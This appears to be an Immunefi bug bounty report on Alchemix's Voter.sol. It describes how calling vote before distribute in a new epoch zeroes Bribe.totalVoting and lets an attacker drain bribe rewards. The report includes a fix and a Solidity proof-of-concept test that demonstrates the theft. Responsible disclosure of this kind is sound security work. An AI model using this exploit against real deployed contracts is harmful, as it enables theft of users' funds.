# 30898 - \[SC - Critical] Call the deposit function before the distribute...

Submitted on May 7th 2024 at 19:44:37 UTC by @cryptoticky for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #30898

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Voter.sol>

Impacts:

* Manipulation of governance voting result deviating from voted outcome and resulting in a direct change from intended effect of original results
* Theft of unclaimed yield

## Description

## Brief/Intro

If an attacker makes a deposit before the `Voter.distribute` function is called in a new epoch, the `Bribe.totalVoting` becomes smaller than the actual sum of votes. This discrepancy provides the attacker with an opportunity to steal funds from the contract.

## Vulnerability Details

* Keeper or anyone will call `Voter.distribute` function to initialize the protocol once a new epoch
* But an attacker can call `Voter.vote` function before the `Voter.distribute` function is called
* If the `Voter.distribute` function is called after the attacker calls `Voter.vote` function, that updates `Bribe.totalVoting` to `0`
* If there is no vote anymore in this epoch, the prevSupply will be 1 when the attacker claims the reward. It means that the attacker can adjust the amount of rewards you will receive. So that the attacker can steal all assets in the Bribe contract.
* If there are other votes after calling distribute function, the attacker can get more than the expected reward.

## Impact Details

* As a result of the vote, it results in a different effect from the expected effect regardless of voting Power.
* An attacker can steal all the rewards in the Bribe contract.

## Recommendation

It is recommended to confirm that the Voter.distribute function was called when users call Voter.vote function in the new epoch, and if it is false, it is recommended to call the distribute function first.

## Proof of Concept

```
// SPDX-License-Identifier: GPL-3
pragma solidity ^0.8.15;

import "./BaseTest.sol";

contract BribePoC is BaseTest {
    uint256 constant DURATION = 2 weeks;
    uint256 constant SECONDS_PER_BLOCK = 12;
    uint256 public epochTime;
    uint256 public epochBlock;

    function setUp() public {
        setupContracts(block.timestamp);
        epochTime = minter.activePeriod();
        epochBlock = block.number;
    }


    function testBugDoSDeposit() public {

        address bribeAddress = voter.bribes(address(sushiGauge));
        address[] memory pools = new address[](1);
        pools[0] = sushiPoolAddress;
        uint256[] memory weights = new uint256[](1);
        weights[0] = 10000;

        // go epoch 1
        uint256 period = minter.activePeriod();
        hevm.warp(period + nextEpoch);

        uint256 targetTokenId = createVeAlcx(admin, TOKEN_1, MAXTIME, false);
        hevm.prank(admin);
        voter.vote(targetTokenId, pools, weights, 0);

        uint256 totalVoting0 = IBribe(bribeAddress).totalVoting();
        assertGt(totalVoting0, 0, "totalVoting0 = 0");

        voter.distribute();

        uint256 totalVoting1 = IBribe(bribeAddress).totalVoting();
        assertEq(totalVoting1, 0, "totalVoting1 != 0");

        uint256 userTokenId = createVeAlcx(beef, TOKEN_1, MAXTIME, false);

        hevm.prank(beef);
        voter.vote(userTokenId, pools, weights, 0);

        totalVoting1 = IBribe(bribeAddress).totalVoting();
        assertEq(totalVoting1, totalVoting0, "totalVoting1 != totalVoting0");


        createThirdPartyBribe(bribeAddress, bal, TOKEN_100K);

        // go epoch 2
        period = minter.activePeriod();
        hevm.warp(period + nextEpoch);

        voter.distribute();

        // in the second block of epoch 2
        address[] memory bribes = new address[](1);
        bribes[0] = address(bribeAddress);
        address[][] memory tokens = new address[][](1);
        tokens[0] = new address[](1);
        tokens[0][0] = bal;

        uint256 beforeBalOfAdmin = IERC20(bal).balanceOf(admin);

        hevm.prank(admin);
        voter.claimBribes(bribes, tokens, targetTokenId);

        uint256 deltaBalOfAdmin = IERC20(bal).balanceOf(admin) - beforeBalOfAdmin;

        // The success means the attacker stole all reward of epoch 1
        // In the Bribe contract, rewards for other users who have not claimed for a long time, including rewards from new epoch, may remain.
        // The attacker can steal all these funds.
        assertEq(TOKEN_100K, deltaBalOfAdmin, "The attack is failed");
    }
}
```
